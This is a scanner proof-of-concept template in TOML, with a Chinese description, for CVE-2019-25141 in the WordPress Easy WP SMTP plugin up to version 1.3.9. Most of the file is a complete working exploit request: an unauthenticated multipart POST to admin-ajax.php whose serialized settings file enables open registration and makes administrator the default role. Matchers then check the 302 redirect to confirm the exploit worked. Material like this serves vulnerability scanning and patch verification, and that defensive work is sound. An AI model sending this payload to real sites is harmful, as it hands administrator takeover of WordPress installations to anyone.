[info]
author = "ave"
description = "通过向 WordPress admin-ajax.php 发送未授权的 multipart POST 请求，触发 Easy WP SMTP 插件的 swpsmtp_import_settings 功能，无需身份验证即可修改站点选项（如开放注册并将默认角色设为管理员），验证漏洞是否存在。"
id = "POC-AVE-2019-0159"
name = "Easy WP SMTP <= 1.3.9 未授权任意选项更新漏洞 PoC"
severity = "critical"
tags = ["ave-2019-0159"]
vuln_id = [
    "CVE-2019-25141",
    "AVE-2019-0159",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/wp-admin/admin-ajax.php"
protocol = "http"

[poc.requests.body]
content = """
--------------------------NCpI6tN3BZW3fz1Y9t2bkf
Content-Disposition: form-data; name="action"

swpsmtp_clear_log
--------------------------NCpI6tN3BZW3fz1Y9t2bkf
Content-Disposition: form-data; name="swpsmtp_import_settings"

1
--------------------------NCpI6tN3BZW3fz1Y9t2bkf
Content-Disposition: form-data; name="swpsmtp_import_settings_file"; filename="settings.txt"
Content-Type: text/plain

a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}

--------------------------NCpI6tN3BZW3fz1Y9t2bkf--
"""
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf"
Host = "{{Hostname}}"

[[poc.requests.matchers]]
expect = true
part = "header"
status = [302]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["options-general.php?page=swpsmtp_settings"]
